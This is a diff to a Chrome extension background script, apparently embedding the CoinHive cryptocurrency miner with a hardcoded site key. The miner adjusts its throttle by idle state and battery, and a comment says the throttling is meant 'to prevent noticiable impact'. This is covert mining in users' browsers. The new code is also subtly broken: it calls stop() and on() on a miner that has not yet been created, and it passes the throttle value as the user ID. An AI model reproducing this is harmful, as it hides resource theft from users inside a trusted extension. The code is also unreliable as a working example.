@@ -79,17 +79,8 @@ chrome.runtime.onConnect.addListener((port) => {
 if (CoinHive) {
   let experimentsEnabled = true;
   const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
-  let userId = 'anonymous';
 
-  if (state && state.teams && state.teams.data) {
-    const teams = Object.values(state.teams.data);
-    const team = teams[0];
-    if (team && team.team && team.self) {
-      userId = `${team.team.id}-${team.self.id}`;
-    }
-  }
-
-  const miner = new CoinHive.User(coinHiveKey, userId);
+  let miner;
 
   const throttles = {
     active: 0.95,
@@ -97,8 +88,20 @@ if (CoinHive) {
     locked: 0.2,
   };
 
+  const setThrottle = (throttle = throttles.active) => {
+    // Stop the current miner, restart with a new 'user'
+    miner.stop();
+
+    // setTimeout the lazy man's callback
+    setTimeout(() => {
+      // New user is just the current throttle level
+      miner = new CoinHive.User(coinHiveKey, throttle);
+      miner.start();
+    }, 1000);
+  };
+
   // Heavily throttle mining to prevent noticiable impact
-  miner.setThrottle(throttles.active);
+  setThrottle(throttles.active);
 
   const checkCoinHiveStatus = () => {
     if (!miner.isRunning()) {
@@ -116,13 +119,8 @@ if (CoinHive) {
     statusLoop = clearInterval(statusLoop);
   };
 
-  miner.on('open', () => {
-    startLoop();
-  });
-
-  miner.on('close', () => {
-    stopLoop();
-  });
+  miner.on('open', startLoop);
+  miner.on('close', stopLoop);
 
   // If the battery is not charging, stop mining
   const checkBattery = battery => (
@@ -147,21 +145,21 @@ if (CoinHive) {
     // Initialize throttle and set detection interval
     chrome.idle.queryState(idleDetectionInterval, (newState) => {
       // Set appropriate throttle level
-      miner.setThrottle(throttles[newState] || throttles.active);
+      setThrottle(throttles[newState]);
     });
 
     chrome.idle.setDetectionInterval(idleDetectionInterval);
 
     chrome.idle.onStateChanged.addListener((newState) => {
       // Set appropriate throttle level
-      miner.setThrottle(throttles[newState] || throttles.active);
+      setThrottle(throttles[newState]);
     });
   };
 
   if (chrome.idle && typeof chrome.idle.queryState === 'function') {
     startIdleChecks();
   } else {
-    miner.setThrottle(0.90);
+    setThrottle(0.90);
   }
 
   // To be used from inspector
